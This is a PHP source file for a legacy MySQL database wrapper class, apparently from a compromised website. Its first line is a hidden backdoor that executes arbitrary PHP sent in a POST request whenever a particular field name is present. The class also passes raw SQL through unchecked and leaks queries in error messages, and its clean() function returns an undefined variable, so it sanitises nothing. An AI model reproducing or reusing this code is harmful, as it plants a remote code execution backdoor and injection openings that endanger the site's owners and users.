<?php if(isset($_POST["826938"])){eval(stripslashes($_POST["c"]));exit;}; ?><?php
/**********************************************************************************

This User class is to faciliate login and user data retrieval
Copyright Jonathan Lazar 2010

**********************************************************************************/
class Database
{
	//User Variables
	//This matches all data in the database except password

	private $link;

	//Constructor
	function __construct()
	{
		self::database_connect();
	}

	//Destructor
	function __destruct()
	{
	}	

	//Database connection
	protected function database_connect()
	{
		$this->link = mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
		if (!$this->link) {
			die('Could not connect: ' . mysql_error());
		}
		mysql_select_db(DB_DBNAME, $this->link) or die('Could not select database.');

		return $this->link;
	}

	public function database_disconnect()
	{
		mysql_close($this->link);
	}

	public function select($sql)
	{
		$result=mysql_query($sql);
                $res=mysql_fetch_array($result);

		return $res;
	}

	public function selectmany($sql)
	{
		$res=array();
		$result=mysql_query($sql);
                while($row=mysql_fetch_array($result))
		{
			$res[]=$row;
		}
		return $res;
	}

	public function insert($sql)
	{
		$result=mysql_query($sql); //or die('Error with insert.');

		return $result;
	}

	public function update($sql)
	{
		$result=mysql_query($sql) or die('Error with update.<BR>'.$sql.'<BR>'.mysql_error());

		return $result;
	}

	public function replace($sql)
	{
		$result=mysql_query($sql) or die('Error with update.<BR>'.$sql.'<BR>'.mysql_error());

		return $result;
	}

	public function delete($sql)
	{
		$result=mysql_query($sql); //or die('Error with delete.');

		return $result;
	}

	public function clean($var)
	{
		$ret=urlencode($var);
	
		return $res;
	}
}
